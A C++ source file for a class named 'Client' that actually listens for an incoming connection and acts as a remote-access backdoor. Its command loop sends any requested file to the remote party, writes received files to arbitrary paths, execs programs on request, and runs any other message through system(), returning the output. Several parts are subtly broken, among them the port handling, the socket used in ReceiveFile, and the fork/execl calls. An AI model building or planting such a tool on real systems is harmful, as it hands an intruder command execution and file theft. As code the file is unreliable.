#include "client.h"
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <iostream>
#include <errno.h>
#include <cstring>
#include <arpa/inet.h>
#include <sstream>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <cstdlib>
#include <netinet/tcp.h>

using namespace std;

extern char** environ;

const string Client::kGetFile = "getfile";
const string Client::kSendFile = "sendfile";
const string Client::kOutput = "output.txt";
const string Client::kRun = "run";

Client::Client() {
    cout << "Creating socket..." << endl;
    socket_ = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_ < 0) {
        cout << "Error creating socket: " << strerror(errno) << endl;
        exit(-1);
    }
    internet_socket_address_.sin_addr.s_addr = INADDR_ANY;
    internet_socket_address_.sin_family = AF_INET;
    internet_socket_address_.sin_port = kDefaultPort;
    cout << "Binding socket..." << endl;
    if (bind(socket_, (sockaddr*)&internet_socket_address_, sizeof(internet_socket_address_))) {
        cout << "Error binding socket: " << strerror(errno) << endl;
        exit(-1);
    }
}

Client::Client(string ip_address, int port) {
    cout << "Creating socket..." << endl;
    socket_ = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_ < 0) {
        cout << "Error creating socket: " << strerror(errno) << endl;
        exit(-1);
    }
    internet_socket_address_.sin_addr.s_addr = inet_addr(ip_address.c_str());
    internet_socket_address_.sin_family = AF_INET;
    internet_socket_address_.sin_port = htons(port);
    cout << "Binding socket..." << endl;
    if (bind(socket_, (sockaddr*)&internet_socket_address_, sizeof(internet_socket_address_))) {
        cout << "Error binding socket: " << strerror(errno) << endl;
        exit(-1);
    }
}

int Client::AcceptConnection() {
    cout << "Listening..." << endl;
    if (listen(socket_, kMaxBacklog) < 0) {
        cout << "Error listening for connection: " << strerror(errno) << endl;
        exit(-1);
    }
    socklen_t internet_socket_address_length = sizeof(internet_socket_address_);
    accepted_socket_ = accept(socket_, (sockaddr*)&internet_socket_address_, &internet_socket_address_length);
    if (accepted_socket_ < 0) {
        cout << "Error accepting socket: " << strerror(errno) << endl;
        exit(-1);
    }
    cout << "Accepted!" << endl;
    return 0;
}

int Client::ReceiveMessage() {
    message_.clear();
    char buffer[kBufferSize + 1];
    memset(buffer, 0, kBufferSize + 1);
    if (recv(accepted_socket_, buffer, kBufferSize, 0) < 0) {
        cout << "Error receiving message: " << strerror(errno) << endl;
    }
    message_ += buffer;
    return 0;
}

int Client::SendMessage() {
    char buffer[kBufferSize + 1];
    memset(buffer, 0, kBufferSize + 1);
    strcpy(buffer, message_.c_str());
    if (send(accepted_socket_, buffer, kBufferSize, 0) < 0) {
        cout << "Error sending message: " << strerror(errno) << endl;
        return -1;
    }
    return 0;
}

int Client::SendFile(string path) {
    // send file path
    message_ = path;
    cout << "Send file to server..." << endl;
    cout << "File name: " << path << endl;
    SendMessage();
    int fd = open(path.c_str(), O_RDONLY);
    char buffer[kBufferSize + 1];
    memset(buffer, 0, kBufferSize + 1);
    struct stat filestat;
    if (stat(path.c_str(), &filestat) < 0) {
        cout << "Error getting file information: " << strerror(errno) << endl;
        return -1;
    }
    // get file size
    memset(buffer, 0, kBufferSize);
    int filesize = filestat.st_size;
    cout << "File size: " << filesize << endl;
    sprintf(buffer, "%d", filesize);
    // send file size
    if (send(accepted_socket_, buffer, kBufferSize, 0) < 0) {
        cout << "Error sending file size: " << strerror(errno) << endl;
        return -1;
    }
    while (true) {
        int readdata = read(fd, buffer, kBufferSize);
        if (readdata < 0) {
            cout << "Error reading data from file: " << strerror(errno) << endl;
            return -1;
        }
        if (readdata == 0) {
            break;
        }
        cout << "Sending data..." << endl;
        if (send(accepted_socket_, buffer, readdata, 0) < 0) {
            cout << "Error sending data: " << strerror(errno) << endl;
            return -1;
        }
        memset(buffer, 0, kBufferSize + 1);
    }
    close(fd);
    cout << "Success!" << endl;
    return 0;
}

int Client::ReceiveFile() {
    // get file path
    ReceiveMessage();
    string path = message_;
    int fd = open(path.c_str(), O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    char buffer[kBufferSize + 1];
    memset(buffer, 0, kBufferSize + 1);
    // get file size
    if (recv(socket_, buffer, kBufferSize, 0) < 0) {
        cout << "Error receiving file size: " << strerror(errno) << endl;
        return -1;
    }
    int filesize = atoi(buffer);
    int total_byte_received = 0;
    // get data
    while (total_byte_received < filesize) {
        memset(buffer, 0, kBufferSize + 1);
        int nbytes = recv(socket_, buffer, kBufferSize, 0);
        if (nbytes < 0) {
            cout << "Error receiving data: " << strerror(errno) << endl;
            return -1;
        }
        write(fd, buffer, nbytes);
        total_byte_received += nbytes;
    }
    close(fd);
    return 0;
}

int Client::Handle() {
    while (true) {
        cout << "Client: ";
        ReceiveMessage();
        if (message_.find(kSendFile) == 0) {
            ReceiveFile();
        } else if (message_.find(kGetFile) == 0) {            
            cout << "Sending file to server..." << endl;
            string path = message_.substr(message_.find(" ") + 1);
            SendFile(path);
        } else if (message_.find(kRun) == 0) {
            string command = message_.substr(message_.find(" ") + 1);
            cout << command << endl;
            fork();
            execl(command.c_str(), NULL);
        } else {
            cout << "System command" << endl;
            string command = message_ + " 1> " + kOutput + " 2> " + kOutput;
            system(command.c_str());
            SendFile(kOutput);
        }
    }
    return 0;
}